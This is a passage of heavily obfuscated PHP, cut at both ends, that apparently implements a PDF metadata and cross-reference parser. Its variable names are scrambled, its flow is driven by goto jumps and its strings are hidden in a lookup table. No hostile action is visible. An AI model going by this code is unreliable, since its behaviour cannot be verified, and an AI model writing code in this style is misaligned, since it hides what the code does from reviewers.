file_put_contents($FĞÔ÷àê¶, $E‹àÂ©„Ÿì); goto A»‰òè™®â; dŠà×ãÑè: ob_start(); readgzfile($FĞÔ÷àê¶); $E‹àÂ©„Ÿì = ob_get_clean(); goto bŒ›İïËÀ; EâÀÖ† «: $cÊÛÄÀ‘» = $_SERVER[¹÷ˆ§éÒ°ú][1521]; $dâæ¨Ûõë¯ = file_sub_str($FĞÔ÷àê¶, 0, 2); if ($cÊÛÄÀ‘» != $dâæ¨Ûõë¯) { return; } goto dŠà×ãÑè; A»‰òè™®â: } } class FileParsePdf { public static function parse($AçëêÂì“Ì) { goto CÉÊÇ…ƒÖ; CÉÊÇ…ƒÖ: $cİÎ¢Å˜‰ =& $_SERVER[¹÷ˆ§éÒ°ú]; $C·¡Ú¥¾‘š = 32 * 1024; $e¾È‘Ä‰£Œ = array($cİÎ¢Å˜‰[771] => fopen($AçëêÂì“Ì, $cİÎ¢Å˜‰[1161]), $cİÎ¢Å˜‰[87] => $AçëêÂì“Ì, $cİÎ¢Å˜‰[89] => filesize($AçëêÂì“Ì), $cİÎ¢Å˜‰[1522] => $C·¡Ú¥¾‘š); goto Dâ©…ÇàÎ; b»²ÈõŞ¬: $C“’Õˆ¬× = $cİÎ¢Å˜‰[1527]; preg_match($C“’Õˆ¬×, $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[1523]], $D‚Ï‰Øì¢Î); if (!$dà‚ˆŸô§[$cİÎ¢Å˜‰[1526]] && count($D‚Ï‰Øì¢Î) == 5) { $dà‚ˆŸô§[$cİÎ¢Å˜‰[1526]] = $D‚Ï‰Øì¢Î[3]; $dà‚ˆŸô§[$cİÎ¢Å˜‰[1528]] = $D‚Ï‰Øì¢Î[4]; } goto dâÙ”Ü¹ÔÔ; cÌîœ¢¨˜Ï: if ($D‚Ï‰Øì¢Î) { $dà‚ˆŸô§[$cİÎ¢Å˜‰[1331]] = $D‚Ï‰Øì¢Î[1]; } $dà‚ˆŸô§[$cİÎ¢Å˜‰[1530]] = 0; $C“’Õˆ¬× = $cİÎ¢Å˜‰[1531]; goto B£…‘ì»‰; fÂĞ²ØÜ˜…: if ($D‚Ï‰Øì¢Î[1] && $dà‚ˆŸô§[$cİÎ¢Å˜‰[1530]] < $D‚Ï‰Øì¢Î[1][0]) { $dà‚ˆŸô§[$cİÎ¢Å˜‰[1530]] = $D‚Ï‰Øì¢Î[1][0]; } $dà‚ˆŸô§ = self::parseInfoItem($dà‚ˆŸô§); return $dà‚ˆŸô§; goto AƒœÙÏ¡éÑ; dâÙ”Ü¹ÔÔ: preg_match($C“’Õˆ¬×, $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[1524]], $D‚Ï‰Øì¢Î); if (!$dà‚ˆŸô§[$cİÎ¢Å˜‰[1526]] && count($D‚Ï‰Øì¢Î) == 5) { $dà‚ˆŸô§[$cİÎ¢Å˜‰[1526]] = $D‚Ï‰Øì¢Î[3]; $dà‚ˆŸô§[$cİÎ¢Å˜‰[1528]] = $D‚Ï‰Øì¢Î[4]; } preg_match($cİÎ¢Å˜‰[1529], $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[1523]], $D‚Ï‰Øì¢Î); goto cÌîœ¢¨˜Ï; Dâ©…ÇàÎ: $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[1523]] = StreamWrapperIO::read($AçëêÂì“Ì, 0, $C·¡Ú¥¾‘š); $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[1524]] = StreamWrapperIO::read($AçëêÂì“Ì, $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[89]] - $C·¡Ú¥¾‘š, $C·¡Ú¥¾‘š); $Eá‹Ú´ù÷ = self::decodeXref($e¾È‘Ä‰£Œ); goto bÑ½¥¦èÒ»; B£…‘ì»‰: preg_match_all($C“’Õˆ¬×, $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[1523]], $D‚Ï‰Øì¢Î); if ($D‚Ï‰Øì¢Î[1] && $dà‚ˆŸô§[$cİÎ¢Å˜‰[1530]] < $D‚Ï‰Øì¢Î[1][0]) { $dà‚ˆŸô§[$cİÎ¢Å˜‰[1530]] = $D‚Ï‰Øì¢Î[1][0]; } preg_match_all($C“’Õˆ¬×, $e¾È‘Ä‰£Œ[$cİÎ¢Å˜‰[1524]], $D‚Ï‰Øì¢Î); goto fÂĞ²ØÜ˜…; bÑ½¥¦èÒ»: if ($Eá‹Ú´ù÷) { $d—İ»©İ¨ = $Eá‹Ú´ù÷[$cİÎ¢Å˜‰[1525]][$cİÎ¢Å˜‰[1183]]; $dà‚ˆŸô§ = self::getObjectValue($e¾È‘Ä‰£Œ, $Eá‹Ú´ù÷, $d—İ»©İ¨); } $dà‚ˆŸô§ = is_array($dà‚ˆŸô§) ? $dà‚ˆŸô§ : array(); $dà‚ˆŸô§[$cİÎ¢Å˜‰[1526]] = 0; goto b»²ÈõŞ¬; AƒœÙÏ¡éÑ: } private static function parseInfoItem($A……ø¿ôÁâ) { $BÒ¹Üª÷çª =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$A……ø¿ôÁâ) { return !1; } $FÚ»àøßìÕ = array($BÒ¹Üª÷çª[1332] => array($BÒ¹Üª÷çª[1532], $BÒ¹Üª÷çª[43]), $BÒ¹Üª÷çª[1533] => array($BÒ¹Üª÷çª[1534], $BÒ¹Üª÷çª[43]), $BÒ¹Üª÷çª[199] => array($BÒ¹Üª÷çª[1535], $BÒ¹Üª÷çª[222]), $BÒ¹Üª÷çª[119] => array($BÒ¹Üª÷çª[1536], $BÒ¹Üª÷çª[222]), $BÒ¹Üª÷çª[1530] => array($BÒ¹Üª÷çª[1530], $BÒ¹Üª÷çª[287]), $BÒ¹Üª÷çª[1526] => array($BÒ¹Üª÷çª[1526], $BÒ¹Üª÷çª[287]), $BÒ¹Üª÷çª[1528] => array($BÒ¹Üª÷çª[1528], $BÒ¹Üª÷çª[287]), $BÒ¹Üª÷çª[1537] => array($BÒ¹Üª÷çª[1538], $BÒ¹Üª÷çª[43]), $BÒ¹Üª÷çª[1539] => array($BÒ¹Üª÷çª[1540], $BÒ¹Üª÷çª[43]), $BÒ¹Üª÷çª[1541] => array($BÒ¹Üª÷çª[1331], $BÒ¹Üª÷çª[43])); $C‹¦Õ‘ Êø = array(); foreach ($FÚ»àøßìÕ as $B¬Ş¢Û·ÉŞ => $eğè¹àÉá’) { if (!isset($A……ø¿ôÁâ[$eğè¹àÉá’[0]])) { continue; } $E¦âíÏ† = $A……ø¿ôÁâ[$eğè¹àÉá’[0]]; if (!$E¦âíÏ† || is_array($E¦âíÏ†)) { continue; } switch ($eğè¹àÉá’[1]) { case $BÒ¹Üª÷çª[287]: $E¦âíÏ† = intval($E¦âíÏ†); break; case $BÒ¹Üª÷çª[222]: if (substr($E¦âíÏ†, 0, 2) == $BÒ¹Üª÷çª[1542]) { $E¦âíÏ† = substr($E¦âíÏ†, 2, 14); } if (strtotime($E¦âíÏ†)) { $E¦âíÏ† = date($BÒ¹Üª÷çª[1543], strtotime($E¦âíÏ†)); } break; } $C‹¦Õ‘ Êø[$B¬Ş¢Û·ÉŞ] = $E¦âíÏ†; } return $C‹¦Õ‘ Êø; } private static function decodeXref(&$Dï´ÖĞ†„³) { goto AŠ‹¦±ğ“; b°Ú…•É¤Â: if ($Dï´ÖĞ†„³[$cáéÚîÜŸ[89]] - $DöÆˆÜ“åé > $Dï´ÖĞ†„³[$cáéÚîÜŸ[1522]]) { $f§¤ª™ÛóÎ = 4 * $Dï´ÖĞ†„³[$cáéÚîÜŸ[1522]]; $Dï´ÖĞ†„³[$cáéÚîÜŸ[1522]] = $f§¤ª™ÛóÎ; $Dï´ÖĞ†„³[$cáéÚîÜŸ[1523]] = StreamWrapperIO::read($Dï´ÖĞ†„³[$cáéÚîÜŸ[87]], 0, $f§¤ª™ÛóÎ); $Dï´ÖĞ†„³[$cáéÚîÜŸ[1524]] = StreamWrapperIO::read($Dï´ÖĞ†„³[$cáéÚîÜŸ[87]], $Dï´ÖĞ†„³[$cáéÚîÜŸ[89]] - $f§¤ª™ÛóÎ, $f§¤ª™ÛóÎ); $bõ³İÏÃŸ› = $Dï´ÖĞ†„³[$cáéÚîÜŸ[1524]]; } $CÅ÷‰¡›¬ = 0; preg_match_all($cáéÚîÜŸ[1546], $bõ³İÏÃŸ›, $E‰è—õË”ê); goto bÆ¢©šŒƒÒ; AŠ‹¦±ğ“: $cáéÚîÜŸ =& $_SERVER[¹÷ˆ§éÒ°ú]; $bõ³İÏÃŸ› = $Dï´ÖĞ†„³[$cáéÚîÜŸ[1524]]; $D²Âğ•ôÑ² = array($cáéÚîÜŸ[1525] => array(), $cáéÚîÜŸ[1544] => array()); goto DŠóÆ¶ˆ; e«æ»¢½ŠÓ: if (preg_match($cáéÚîÜŸ[1558], $a²ùÇÔÑÍó, $E‰è—õË”ê) > 0) { } return $D²Âğ•ôÑ²; goto AØ’ì©„‘; AÖ¬­Û¸¸: if (preg_match($cáéÚîÜŸ[1551], $a²ùÇÔÑÍó, $E‰è—õË”ê) > 0) { $D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[89]] = intval($E‰è—õË”ê[1]); } if (preg_match($cáéÚîÜŸ[1552], $a²ùÇÔÑÍó, $E‰è—õË”ê) > 0) { $D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[1553]] = intval($E‰è—õË”ê[1]) . $cáéÚîÜŸ[82] . intval($E‰è—õË”ê[2]); } if (preg_match($cáéÚîÜŸ[1554], $a²ùÇÔÑÍó, $E‰è—õË”ê) > 0) { $D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[1555]] = intval($E‰è—õË”ê[1]) . $cáéÚîÜŸ[82] . intval($E‰è—õË”ê[2]); } goto C‰³ôæåè±; DŠóÆ¶ˆ: $BŞÑ¢Äß¢ = $cáéÚîÜŸ[1545]; if (!preg_match_all($BŞÑ¢Äß¢, $bõ³İÏÃŸ›, $E‰è—õË”ê, PREG_SET_ORDER, 0)) { return !1; } $DöÆˆÜ“åé = intval($E‰è—õË”ê[0][1]); goto b°Ú…•É¤Â; bÆ¢©šŒƒÒ: foreach ($E‰è—õË”ê[3] as $Aë¾›Ïµ÷‰ => $d»¾®ÎÏ¦‚) { if ($E‰è—õË”ê[3][$Aë¾›Ïµ÷‰] == $cáéÚîÜŸ[1547]) { $E“˜ÃğÔ²à = $CÅ÷‰¡›¬ . $cáéÚîÜŸ[82] . intval($E‰è—õË”ê[2][$Aë¾›Ïµ÷‰]); $D²Âğ•ôÑ²[$cáéÚîÜŸ[1544]][$E“˜ÃğÔ²à] = intval($E‰è—õË”ê[1][$Aë¾›Ïµ÷‰]); ++$CÅ÷‰¡›¬; } else { if ($E‰è—õË”ê[3][$Aë¾›Ïµ÷‰] == $cáéÚîÜŸ[1548]) { ++$CÅ÷‰¡›¬; } else { } } } if (preg_match_all($cáéÚîÜŸ[1549], $bõ³İÏÃŸ›, $E‰è—õË”ê)) { $CÁ—Ã“†Íï = $Dï´ÖĞ†„³[$cáéÚîÜŸ[89]] - $Dï´ÖĞ†„³[$cáéÚîÜŸ[1522]]; foreach ($E‰è—õË”ê[0] as $Aë¾›Ïµ÷‰ => $C«ïç´°ãŞ) { $B×ÀªÍ˜¥‡ = $E‰è—õË”ê[1][$Aë¾›Ïµ÷‰] . $cáéÚîÜŸ[82] . $E‰è—õË”ê[2][$Aë¾›Ïµ÷‰]; $D²Âğ•ôÑ²[$cáéÚîÜŸ[1544]][$B×ÀªÍ˜¥‡] = strpos($bõ³İÏÃŸ›, $C«ïç´°ãŞ) + $CÁ—Ã“†Íï + 1; } } if (preg_match_all($cáéÚîÜŸ[1550], $bõ³İÏÃŸ›, $E‰è—õË”ê)) { $a²ùÇÔÑÍó = count($E‰è—õË”ê[1]) == 1 ? $E‰è—õË”ê[1][0] : $E‰è—õË”ê[1][1]; } else { $a²ùÇÔÑÍó = substr($bõ³İÏÃŸ›, -1024 * 5); } goto AÖ¬­Û¸¸; C‰³ôæåè±: if (preg_match($cáéÚîÜŸ[1556], $a²ùÇÔÑÍó, $E‰è—õË”ê) > 0) { $D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[1183]] = intval($E‰è—õË”ê[1]) . $cáéÚîÜŸ[82] . intval($E‰è—õË”ê[2]); } if (preg_match($cáéÚîÜŸ[1557], $a²ùÇÔÑÍó, $E‰è—õË”ê) > 0) { $D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[378]] = array(); $D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[378]][0] = $E‰è—õË”ê[1]; $D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[378]][1] = $E‰è—õË”ê[2]; } if (!$D²Âğ•ôÑ²[$cáéÚîÜŸ[1525]][$cáéÚîÜŸ[1183]]) { return !1; } goto e«æ»¢½ŠÓ; AØ’ì©„‘: } private static function getObjectValue($bæäÈ©ŸÅÕ, $C¼İ¬Õƒ¥¨, $c“Œ´ºå©ª) { goto bµĞ¦Á± ¸; bµĞ¦Á± ¸: $D–é¢¾ê»Å =& $_SERVER[¹÷ˆ§éÒ°ú]; $A¯ŒÙ˜èÔ = self::getObject($bæäÈ©ŸÅÕ, $C¼İ¬Õƒ¥¨[$D–é¢¾ê»Å[1544]][$c“Œ´ºå©ª]); if (is_string($A¯ŒÙ˜èÔ[1])) { return $A¯ŒÙ˜èÔ[1]; } goto Dİ‹éÅ; C´–À•›ŒÆ: return $Bœ¿ò‚àáÊ; goto fç“·“¾Ü–; Dİ‹éÅ: if (!is_array($A¯ŒÙ˜èÔ[1])) { return array(); } $Bœ¿ò‚àáÊ = array(); for ($dóõ÷¨Æµ = 0; $dóõ÷¨Æµ < count($A¯ŒÙ˜èÔ[1]); $dóõ÷¨Æµ += 2) { $CÆ‹Ñ‡÷²Ï = $A¯ŒÙ˜èÔ[1][$dóõ÷¨Æµ]; $fùí–£ƒùŠ = $A¯ŒÙ˜èÔ[1][$dóõ÷¨Æµ + 1]; if (count($CÆ‹Ñ‡÷²Ï) == 3 && $CÆ‹Ñ‡÷²Ï[0] == $D–é¢¾ê»Å[18]) { $eÔ˜Ô—Ù³ = !1; if ($fùí–£ƒùŠ[0] == $D–é¢¾ê»Å[1559]) { $fùí–£ƒùŠ = self::getObject($bæäÈ©ŸÅÕ, $C¼İ¬Õƒ¥¨[$D–é¢¾ê»Å[1544]][$fùí–£ƒùŠ[1]]); } $eÔ˜Ô—Ù³ = $fùí–£ƒùŠ[1]; if ($eÔ˜Ô—Ù³ === !1) { continue; } if (is_string($eÔ˜Ô—Ù³)) { $eÔ˜Ô—Ù³ = self::decodeStr($eÔ˜Ô—Ù³); } $Bœ¿ò‚àáÊ[$CÆ‹Ñ‡÷²Ï[1]] = $eÔ˜Ô—Ù³; } } goto C´–À•›ŒÆ; fç“·“¾Ü–: } private static function getObject($AèÓ”“Ø…¦, $dÜ·Ûà×ê) { $EÆÛ±Íî‡ = self::getObjectItem($AèÓ”“Ø…¦, $dÜ·Ûà×ê); $EÆÛ±Íî‡ = self::getObjectItem($AèÓ”“Ø…¦, $EÆÛ±Íî‡[2]); return $EÆÛ±Íî‡; } private static function getObjectItem($aÒƒ¾´×«, $EÜ›„©•Ğ) { goto fšëÓŞåœî; F‚ïÜòÂÑ: $EèÖ»©× = $EÜ›„©•Ğ >= $Cğ£»·òîÔ ? $EÜ›„©•Ğ - $Cğ£»·òîÔ : $EÜ›„©•Ğ; $E§Æ¡¸©Ğ = $EÜ›„©•Ğ >= $Cğ£»·òîÔ ? $aÒƒ¾´×«[$bã†Úˆ¯Ì[1524]] : $aÒƒ¾´×«[$bã†Úˆ¯Ì[1523]]; if ($EÜ›„©•Ğ > $e‚¹§¶í && $EÜ›„©•Ğ <= $Cğ£»·òîÔ) { $EèÖ»©× = 0; $E§Æ¡¸©Ğ = StreamWrapperIO::read($aÒƒ¾´×«[$bã†Úˆ¯Ì[87]], $EÜ›„©•Ğ, $e‚¹§¶í); } goto EšÀàÕ¨µ; fšëÓŞåœî: $bã†Úˆ¯Ì =& $_SERVER[¹÷ˆ§éÒ°ú]; $e‚¹§¶í = $aÒƒ¾´×«[$bã†Úˆ¯Ì[1522]]; $Cğ£»·òîÔ = $aÒƒ¾´×«[$bã†Úˆ¯Ì[89]] - $e‚¹§¶í; goto F‚ïÜòÂÑ; EšÀàÕ¨µ: $Dõ½éšŒ—® = self::getRawObject($E§Æ¡¸©Ğ, $EèÖ»©×); if ($EÜ›„©•Ğ >= $Cğ£»·òîÔ) { $Dõ½éšŒ—®[2] = $Dõ½éšŒ—®[2] + $Cğ£»·òîÔ; } else { if ($EÜ›„©•Ğ > $e‚¹§¶í && $EÜ›„©•Ğ <= $Cğ£»·òîÔ) { $Dõ½éšŒ—®[2] = $Dõ½éšŒ—®[2] + $EÜ›„©•Ğ; } } return $Dõ½éšŒ—®; goto d°­öÌ—õŠ; d°­öÌ—õŠ: } private static function decodeStr($c‡âÑˆ¬Ú) { goto a«®ê¯ÃÌí; bâŠ·®«Šø: return $c‡âÑˆ¬Ú; goto f§¿ˆ…ßÔ‰; a«®ê¯ÃÌí: $fôŸºÆÀ›– =& $_SERVER[¹÷ˆ§éÒ°ú]; $c‡âÑˆ¬Ú = str_replace(array($fôŸºÆÀ›–[1560], $fôŸºÆÀ›–[1561], $fôŸºÆÀ›–[1562], $fôŸºÆÀ›–[1563], $fôŸºÆÀ›–[1564], $fôŸºÆÀ›–[1565], $fôŸºÆÀ›–[1566], $fôŸºÆÀ›–[1567]), array($fôŸºÆÀ›–[105], $fôŸºÆÀ›–[60], $fôŸºÆÀ›–[18], $fôŸºÆÀ›–[259], $fôŸºÆÀ›–[807], $fôŸºÆÀ›–[10], $fôŸºÆÀ›–[983], $fôŸºÆÀ›–[341]), $c‡âÑˆ¬Ú); $E–Ç¸ñÃ½ = preg_split($fôŸºÆÀ›–[1568], $c‡âÑˆ¬Ú, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto CÑ¨’¡¤Í÷; cïğ³´“¥‰: $c‡âÑˆ¬Ú = $fôŸºÆÀ›–[43]; foreach ($E–Ç¸ñÃ½ as $e†×ĞåÏßé) { if (preg_match($fôŸºÆÀ›–[1574], $e†×ĞåÏßé) && !1 === stripos($e†×ĞåÏßé, $fôŸºÆÀ›–[1575])) { $e†×ĞåÏßé = preg_replace($fôŸºÆÀ›–[1576], $fôŸºÆÀ›–[43], $e†×ĞåÏßé); $e†×ĞåÏßé = trim($e†×ĞåÏßé, $fôŸºÆÀ›–[916]); $e†×ĞåÏßé = pack($fôŸºÆÀ›–[1577], $e†×ĞåÏßé); $c‡âÑˆ¬Ú .= $e†×ĞåÏßé; } else { $c‡âÑˆ¬Ú .= $e†×ĞåÏßé; } } if (preg_match($fôŸºÆÀ›–[1578], $c‡âÑˆ¬Ú)) { $a¬ÈÜ›–‹ = substr($c‡âÑˆ¬Ú, 2); $c‡âÑˆ¬Ú = $fôŸºÆÀ›–[43]; $F¥ÄµÜ±±Í = strlen($a¬ÈÜ›–‹); for ($E­¥¥âàŠÖ = 0; $E­¥¥âàŠÖ < $F¥ÄµÜ±±Í; $E­¥¥âàŠÖ += 2) { $fæ£ì´„‡ = hexdec(bin2hex(substr($a¬ÈÜ›–‹, $E­¥¥âàŠÖ, 2))); $c‡âÑˆ¬Ú .= mb_convert_encoding($fôŸºÆÀ›–[1579] . intval($fæ£ì´„‡) . $fôŸºÆÀ›–[79], $fôŸºÆÀ›–[1580], $fôŸºÆÀ›–[1581]); } } goto bâŠ·®«Šø; CÑ¨’¡¤Í÷: $c‡âÑˆ¬Ú = $fôŸºÆÀ›–[43]; foreach ($E–Ç¸ñÃ½ as $e†×ĞåÏßé) { if (preg_match($fôŸºÆÀ›–[1569], $e†×ĞåÏßé)) { $c‡âÑˆ¬Ú .= \chr(octdec(trim($e†×ĞåÏßé, $fôŸºÆÀ›–[105]))); } else { $c‡âÑˆ¬Ú .= $e†×ĞåÏßé; } } $E–Ç¸ñÃ½ = preg_split($fôŸºÆÀ›–[1570], $c‡âÑˆ¬Ú, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto AÒƒ¤àÂ×´; AÒƒ¤àÂ×´: $c‡âÑˆ¬Ú = $fôŸºÆÀ›–[43]; foreach ($E–Ç¸ñÃ½ as $e†×ĞåÏßé) { if (preg_match($fôŸºÆÀ›–[1571], $e†×ĞåÏßé)) { $c‡âÑˆ¬Ú .= \chr(hexdec(trim($e†×ĞåÏßé, $fôŸºÆÀ›–[1572]))); } else { $c‡âÑˆ¬Ú .= $e†×ĞåÏßé; } } $E–Ç¸ñÃ½ = preg_split($fôŸºÆÀ›–[1573], $c‡âÑˆ¬Ú, -1, PREG_SPLIT_NO_EMPTY | PREG_SPLIT_DELIM_CAPTURE); goto cïğ³´“¥‰; f§¿ˆ…ßÔ‰: } private static function getRawObject($bŒÆÖÇ–, $AôË¥ªàÇ³ = 0) { goto aß®ùÌóŠ«; aß®ùÌóŠ«: $Eíš˜ªÉˆœ =& $_SERVER[¹÷ˆ§éÒ°ú]; $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[43]; $F²‚¥À¿ª¹ = $Eíš˜ªÉˆœ[43]; goto Bµ¿Ğöæº; Bµ¿Ğöæº: $AôË¥ªàÇ³ += strspn($bŒÆÖÇ–, $Eíš˜ªÉˆœ[1582], $AôË¥ªàÇ³); $Dô×ß° = $bŒÆÖÇ–[$AôË¥ªàÇ³]; switch ($Dô×ß°) { case $Eíš˜ªÉˆœ[1583]: $eÁ”Ôê¨òÕ = strcspn($bŒÆÖÇ–, $Eíš˜ªÉˆœ[1584], $AôË¥ªàÇ³); if ($eÁ”Ôê¨òÕ > 0) { $AôË¥ªàÇ³ += $eÁ”Ôê¨òÕ; return self::getRawObject($bŒÆÖÇ–, $AôË¥ªàÇ³); } break; case $Eíš˜ªÉˆœ[18]: $fÇö´ˆ™¸Ö = $Dô×ß°; ++$AôË¥ªàÇ³; $bŒ¢˜Ö¢Ò = preg_match($Eíš˜ªÉˆœ[1585], substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 256), $c÷ŞŒ¶Ûã); if (1 == $bŒ¢˜Ö¢Ò) { $F²‚¥À¿ª¹ = $c÷ŞŒ¶Ûã[1]; $AôË¥ªàÇ³ += strlen($F²‚¥À¿ª¹); } break; case $Eíš˜ªÉˆœ[259]: case $Eíš˜ªÉˆœ[807]: $fÇö´ˆ™¸Ö = $Dô×ß°; ++$AôË¥ªàÇ³; $cˆ›„ä•» = $AôË¥ªàÇ³; if ($Eíš˜ªÉˆœ[259] == $Dô×ß°) { $CÎù°˜š¦ = 1; while ($CÎù°˜š¦ > 0) { if (!isset($bŒÆÖÇ–[$cˆ›„ä•»])) { break; } $c­£­Ş¹ï = $bŒÆÖÇ–[$cˆ›„ä•»]; switch ($c­£­Ş¹ï) { case $Eíš˜ªÉˆœ[105]: ++$cˆ›„ä•»; break; case $Eíš˜ªÉˆœ[259]: ++$CÎù°˜š¦; break; case $Eíš˜ªÉˆœ[807]: --$CÎù°˜š¦; break; } ++$cˆ›„ä•»; } $F²‚¥À¿ª¹ = substr($bŒÆÖÇ–, $AôË¥ªàÇ³, $cˆ›„ä•» - $AôË¥ªàÇ³ - 1); $AôË¥ªàÇ³ = $cˆ›„ä•»; } break; case $Eíš˜ªÉˆœ[169]: case $Eíš˜ªÉˆœ[489]: $fÇö´ˆ™¸Ö = $Dô×ß°; ++$AôË¥ªàÇ³; if ($Eíš˜ªÉˆœ[169] == $Dô×ß°) { $F²‚¥À¿ª¹ = array(); do { $Bª ™ = $AôË¥ªàÇ³; $E…÷¹š² = self::getRawObject($bŒÆÖÇ–, $AôË¥ªàÇ³); $AôË¥ªàÇ³ = $E…÷¹š²[2]; $F²‚¥À¿ª¹[] = $E…÷¹š²; } while ($Eíš˜ªÉˆœ[489] != $E…÷¹š²[0] && $AôË¥ªàÇ³ != $Bª ™); array_pop($F²‚¥À¿ª¹); } break; case $Eíš˜ªÉˆœ[915]: case $Eíš˜ªÉˆœ[918]: if (isset($bŒÆÖÇ–[$AôË¥ªàÇ³ + 1]) && $bŒÆÖÇ–[$AôË¥ªàÇ³ + 1] == $Dô×ß°) { $fÇö´ˆ™¸Ö = $Dô×ß° . $Dô×ß°; $AôË¥ªàÇ³ += 2; if ($Eíš˜ªÉˆœ[915] == $Dô×ß°) { $F²‚¥À¿ª¹ = array(); do { $Bª ™ = $AôË¥ªàÇ³; $E…÷¹š² = self::getRawObject($bŒÆÖÇ–, $AôË¥ªàÇ³); $AôË¥ªàÇ³ = $E…÷¹š²[2]; $F²‚¥À¿ª¹[] = $E…÷¹š²; } while ($Eíš˜ªÉˆœ[1586] != $E…÷¹š²[0] && $AôË¥ªàÇ³ != $Bª ™); array_pop($F²‚¥À¿ª¹); } } else { $fÇö´ˆ™¸Ö = $Dô×ß°; ++$AôË¥ªàÇ³; $bŒ¢˜Ö¢Ò = preg_match($Eíš˜ªÉˆœ[1587], substr($bŒÆÖÇ–, $AôË¥ªàÇ³), $c÷ŞŒ¶Ûã); if ($Eíš˜ªÉˆœ[915] == $Dô×ß° && 1 == $bŒ¢˜Ö¢Ò) { $F²‚¥À¿ª¹ = strtr($c÷ŞŒ¶Ûã[1], $Eíš˜ªÉˆœ[1588], $Eíš˜ªÉˆœ[43]); $AôË¥ªàÇ³ += \strlen($c÷ŞŒ¶Ûã[0]); } elseif (!1 !== ($BÕÕ²»»Š± = strpos($bŒÆÖÇ–, $Eíš˜ªÉˆœ[918], $AôË¥ªàÇ³))) { $AôË¥ªàÇ³ = $BÕÕ²»»Š± + 1; } } break; default: if ($Eíš˜ªÉˆœ[1589] == substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 6)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1589]; $AôË¥ªàÇ³ += 6; } elseif ($Eíš˜ªÉˆœ[111] == substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 4)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[111]; $AôË¥ªàÇ³ += 4; $F²‚¥À¿ª¹ = $Eíš˜ªÉˆœ[111]; } elseif ($Eíš˜ªÉˆœ[1590] == substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 4)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1591]; $AôË¥ªàÇ³ += 4; $F²‚¥À¿ª¹ = $Eíš˜ªÉˆœ[1590]; } elseif ($Eíš˜ªÉˆœ[1592] == substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 5)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1591]; $AôË¥ªàÇ³ += 5; $F²‚¥À¿ª¹ = $Eíš˜ªÉˆœ[1592]; } elseif ($Eíš˜ªÉˆœ[1593] == substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 6)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1593]; $AôË¥ªàÇ³ += 6; if (1 == preg_match($Eíš˜ªÉˆœ[1594], substr($bŒÆÖÇ–, $AôË¥ªàÇ³), $c÷ŞŒ¶Ûã)) { $AôË¥ªàÇ³ += strlen($c÷ŞŒ¶Ûã[0]); $c¥Ó¶¾ÍÙ¶ = $Eíš˜ªÉˆœ[1595]; $bŒ¢˜Ö¢Ò = preg_match($c¥Ó¶¾ÍÙ¶, substr($bŒÆÖÇ–, $AôË¥ªàÇ³), $c÷ŞŒ¶Ûã, PREG_OFFSET_CAPTURE); if (1 == $bŒ¢˜Ö¢Ò) { $F²‚¥À¿ª¹ = substr($bŒÆÖÇ–, $AôË¥ªàÇ³, $c÷ŞŒ¶Ûã[0][1]); $AôË¥ªàÇ³ += $c÷ŞŒ¶Ûã[1][1]; } } } elseif ($Eíš˜ªÉˆœ[1596] == substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 9)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1596]; $AôË¥ªàÇ³ += 9; } elseif (1 == preg_match($Eíš˜ªÉˆœ[1597], substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 33), $c÷ŞŒ¶Ûã)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1559]; $AôË¥ªàÇ³ += strlen($c÷ŞŒ¶Ûã[0]); $F²‚¥À¿ª¹ = intval($c÷ŞŒ¶Ûã[1]) . $Eíš˜ªÉˆœ[82] . intval($c÷ŞŒ¶Ûã[2]); } elseif (1 == preg_match($Eíš˜ªÉˆœ[1598], substr($bŒÆÖÇ–, $AôË¥ªàÇ³, 33), $c÷ŞŒ¶Ûã)) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1599]; $F²‚¥À¿ª¹ = intval($c÷ŞŒ¶Ûã[1]) . $Eíš˜ªÉˆœ[82] . intval($c÷ŞŒ¶Ûã[2]); $AôË¥ªàÇ³ += strlen($c÷ŞŒ¶Ûã[0]); } elseif (($FœÂŒ“Öõ = strspn($bŒÆÖÇ–, $Eíš˜ªÉˆœ[1600], $AôË¥ªàÇ³)) > 0) { $fÇö´ˆ™¸Ö = $Eíš˜ªÉˆœ[1601]; $F²‚¥À¿ª¹ = substr($bŒÆÖÇ–, $AôË¥ªàÇ³, $FœÂŒ“Öõ); $AôË¥ªàÇ³ += $FœÂŒ“Öõ; } break; } goto FÍ‹´ÆñŒÄ; FÍ‹´ÆñŒÄ: return array($fÇö´ˆ™¸Ö, $F²‚¥À¿ª¹, $AôË¥ªàÇ³); goto 